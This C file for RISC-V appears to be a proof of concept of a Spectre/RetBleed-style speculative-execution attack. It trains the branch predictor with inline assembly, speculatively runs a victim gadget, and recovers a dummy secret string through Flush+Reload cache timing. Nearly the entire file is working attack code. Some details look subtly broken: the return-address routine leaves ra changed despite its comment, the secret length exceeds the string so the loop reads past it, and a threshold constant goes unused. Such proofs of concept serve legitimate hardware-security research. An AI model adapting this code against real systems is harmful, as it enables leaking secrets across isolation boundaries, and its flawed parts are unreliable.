#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

static inline uint64_t measure_cycles(volatile uint8_t *addr){
    uint64_t t1 = rdcycle();
    volatile uint8_t v = *addr; (void)v;
    return rdcycle() - t1;
}

static uint64_t calibrate_threshold(uint8_t *probe_base){
    // Crude calibration: take min of several warmed hits and avg of cold misses
    const int iters = 64;
    uint64_t hit_min = (uint64_t)-1, miss_avg = 0;
    // Warm one line
    volatile uint8_t *warm = probe_base;
    for(int i=0;i<32;i++){ volatile uint8_t x = *warm; (void)x; }
    for(int i=0;i<iters;i++){
        uint64_t c = measure_cycles((volatile uint8_t*)warm);
        if(c < hit_min) hit_min = c;
    }
    // Choose a far line likely mapping to different set; here +4096*8 as heuristic
    volatile uint8_t *cold = probe_base + 4096*8;
    // Try to evict by touching a large range; fallback to flushCache if available macro
    for(int r=0;r<128;r++){ volatile uint8_t x = probe_base[(r*64)%(256*64)]; (void)x; }
    for(int i=0;i<iters;i++){
        // Try to keep it cold by simple dummy sweep
        for(int r=0;r<128;r++){ volatile uint8_t x = probe_base[(r*64)%(256*64)]; (void)x; }
        uint64_t c = measure_cycles((volatile uint8_t*)cold);
        miss_avg += c;
    }
    miss_avg /= iters;
    uint64_t thr = (hit_min*3 + miss_avg*1)/4; // skew toward miss
    if(thr < hit_min+2) thr = hit_min+2;
    return thr;
}


#define NUM_TRAINING 6          // Training iterations, related to branch predictor state (e.g., 2-bit counter needs >= 4 for strong predict)
#define NUM_ROUNDS 1            // Rounds for the outer train+attack sequence (not used in inner loop logic)
#define SAME_INDEX_ROUNDS 10    // Repetitions for attacking the same secret index for reliability
#define SECRET_LENGTH 26        // Length of the secret string to extract
#define CACHE_THRESHOLD 50      // Cache hit time threshold in cycles

uint64_t array1_size = 16;      // Size of array1 (used for non-secret index)
uint8_t padding1[64];           // Padding, potentially for cache alignment
// Array used in victim function, indexed by potentially secret value during speculation
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}; // Only first 16 seem used based on array1_size?
uint8_t padding2[64];           // Padding
// Probe array for Flush+Reload cache side-channel attack
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
// Secret data to be leaked
char* secretData = "ThisIsTheSecretString";

/**
 * @brief Finds the indices and values of the top two largest elements in an array.
 * @param inArray Input array of scores (e.g., cache hit counts).
 * @param inArraySize Size of the input array.
 * @param outIdxArray Output array storing the indices of the top two values.
 * @param outValArray Output array storing the top two values.
 */
void findTopTwo(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray) {
    outValArray[0] = 0; // Max value
    outValArray[1] = 0; // Second max value
    outIdxArray[0] = 0; // Index of max value
    outIdxArray[1] = 0; // Index of second max value

    for (uint64_t i = 0; i < inArraySize; ++i) {
        if (inArray[i] > outValArray[0]) {
            // Found new max
            outValArray[1] = outValArray[0]; // Shift old max to second max
            outIdxArray[1] = outIdxArray[0];
            outValArray[0] = inArray[i];     // Store new max value
            outIdxArray[0] = i;              // Store new max index
        } else if (inArray[i] > outValArray[1]) {
            // Found new second max
            outValArray[1] = inArray[i];     // Store new second max value
            outIdxArray[1] = i;              // Store new second max index
        }
    }
}

/**
 * @brief Victim function potentially executed speculatively.
 * Accesses array2 based on data from array1[idx]. Leaks array1[idx] via cache side channel.
 * @param idx Index provided (potentially speculatively) to access array1.
 */
void victimFunction(uint64_t idx) {
    // Access array2 at an index derived from array1[idx].
    // This caches the line in array2 corresponding to the value array1[idx].
    uint8_t temp = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    (void)temp; // Prevent unused variable warning
}

/**
 * @brief Placeholder function, likely used as an alternative target during branch/call training.
 */
void placeholderFunction() {
    asm("nop");
}

/**
 * @brief Manipulates the return address (RA) stored on the stack.
 * This is a key component of RetBleed or similar return-address-based attacks.
 * The exact manipulation (addi ra, ra, 16) aims to misdirect the 'ret' instruction.
 * Note: This simple version restores RA immediately; real exploits might not.
 */
void manipulateReturnAddress() {
    asm volatile( // Use volatile to prevent optimization
        "addi sp, sp, -8\n"  // Allocate stack space
        "sd ra, 0(sp)\n"     // Save original return address (RA)
        "addi ra, ra, 16\n"  // Temporarily modify RA (for predictor/RSB pollution)
        "ld t0, 0(sp)\n"     // Keep original RA in t0
        "sd t0, 0(sp)\n"     // Leave original RA on stack so real return path restores correctly
        "addi sp, sp, 8\n"   // Deallocate stack space
        : /* no output */
        : /* no input */
        : "memory" );        // Clobbers memory due to stack access
}

int main(void) {
    uint64_t placeholderAddr = (uint64_t)(&placeholderFunction);
    uint64_t victimAddr = (uint64_t)(&victimFunction);
    uint64_t startTime, elapsedTime, passInAddr;
    // Calculate the offset between secretData and array1 start - used for attack index calculation
    uint64_t attackIndex = (uint64_t)(secretData - (char*)array1);
    uint64_t passInIndex, randomIndex; // Index passed to victim; non-secret index for training
    uint8_t dummy = 0;            // Dummy variable for cache read
    static uint64_t results[256]; // Cache hit results

    uint64_t g_threshold = calibrate_threshold(array2);

    printf("Starting the loop...\n");

    // Loop through each byte of the secret
    for(uint64_t i = 0; i < SECRET_LENGTH; ++i) {

        // Reset results array for the current secret byte attack
        for(uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        printf("Executing attack for secret byte %lu...\n", i);

        // Repeat training/attack sequence for reliability
        for(uint64_t round = 0; round < SAME_INDEX_ROUNDS; ++round) {

            // Flush the probe array (array2) before each attempt
            flushCache((uint64_t)array2, sizeof(array2));

            // Training and attack loop (Spectre-BTB/BHB/RetBleed style)
            // Iterates backwards to perform attack step (k=0) last for some variants
            for(int64_t k = ((NUM_TRAINING + 1) * NUM_ROUNDS) - 1; k >= 0; --k) {

                // Conditionally select target address for JALR instruction
                // Selects 'placeholderAddr' during training (k % (N+1) != 0)
                // Selects 'victimAddr' during attack phase (k % (N+1) == 0)
                passInAddr = ((k % (NUM_TRAINING + 1)) - 1) & ~0xFFFF;
                passInAddr = (passInAddr | (passInAddr >> 16));
                passInAddr = victimAddr ^ (passInAddr & (placeholderAddr ^ victimAddr));

                // Conditionally select index for victimFunction
                // Selects non-secret 'randomIndex' during training
                // Selects secret-derived 'attackIndex' during attack phase
                randomIndex = round % array1_size; // Use a non-secret index from array1
                passInIndex = ((k % (NUM_TRAINING + 1)) - 1) & ~0xFFFF;
                passInIndex = (passInIndex | (passInIndex >> 16));
                passInIndex = randomIndex ^ (passInIndex & (attackIndex ^ randomIndex));

                flushCache((uint64_t)array2, sizeof(array2));

                // Loop with NOPs (or other instructions) to potentially manipulate Branch History Register (BHR) state
                for(uint64_t l = 0; l < 30; ++l) {
                    asm(""); // Empty asm likely still involves a loop branch
                }

                // Potentially manipulate return address (part of RetBleed concept)
                manipulateReturnAddress();

                // Execute JALR after delay, targeting selected address, passing selected index
                // The complex FP sequence calculates '2', adds it to (addr-2), effectively just delaying.
                // 'passInAddr' determines if victim or placeholder is called.
                // 'passInIndex' (in a0) determines the index used if victimFunction is called.
                asm volatile( // Use volatile
                    "addi %[addr], %[addr], -2\n" // Delay start
                    "addi t1, zero, 2\n"
                    "slli t2, t1, 0x4\n"
                    "fcvt.s.lu fa4, t1\n"
                    "fcvt.s.lu fa5, t2\n"
                    "fdiv.s fa5, fa5, fa4\n"
                    "fdiv.s fa5, fa5, fa4\n"
                    "fdiv.s fa5, fa5, fa4\n"
                    "fdiv.s fa5, fa5, fa4\n"
                    "fcvt.lu.s t2, fa5, rtz\n"
                    "add %[addr], %[addr], t2\n" // Delay end (addr unchanged)
                    "mv a0, %[arg]\n"           // Move index argument into a0
                    "jalr ra, %[addr], 0\n"     // Jump to target, link return address in ra (overwritten by next call)
                    : /* no output */
                    : [addr] "r" (passInAddr), [arg] "r" (passInIndex)
                    : "a0", "t1", "t2", "fa4", "fa5", "memory"); // Clobbers + memory for safety
            } // End training/attack loop k

            // Probe phase: Measure access time to array2 elements
            for (uint64_t m = 0; m < 256; ++m) {
                uint8_t* current_addr = &array2[m * L1_BLOCK_SZ_BYTES];
                startTime = rdcycle();
                dummy &= *current_addr; // Access element, prevent optimization
                elapsedTime = (rdcycle() - startTime);

                // Check if access time indicates a cache hit
                if (elapsedTime < g_threshold) {
                    results[m] += 1; // Increment hit count for this byte value (m)
                }
            }
        } // End rounds for same index (round)

        // Analyze results: Find the byte value(s) with the most cache hits
        uint8_t bestGuesses[2];
        uint64_t bestHits[2];
        findTopTwo(results, 256, bestGuesses, bestHits);

        // Print the top two guesses for the current secret byte
        // Note: The address printed is the calculated location within array1, not secretData directly
        printf("Mem[0x%llx] = expect('%c') ?= guess(hits,dec,char) 1.(%llu, %d, %c) 2.(%llu, %d, %c)\n",
               (unsigned long long)(array1 + attackIndex), // Address of the source byte in array1
               secretData[i],     // Expected character from secretData
               (unsigned long long)bestHits[0], bestGuesses[0], (bestGuesses[0] ? bestGuesses[0] : '?'), // Top guess
               (unsigned long long)bestHits[1], bestGuesses[1], (bestGuesses[1] ? bestGuesses[1] : '?')); // Second guess

        // Increment index offset for the next secret byte
        ++attackIndex;
    } // End secret byte loop (i)

    printf("\nExtraction loop finished.\n");
    return 0;
}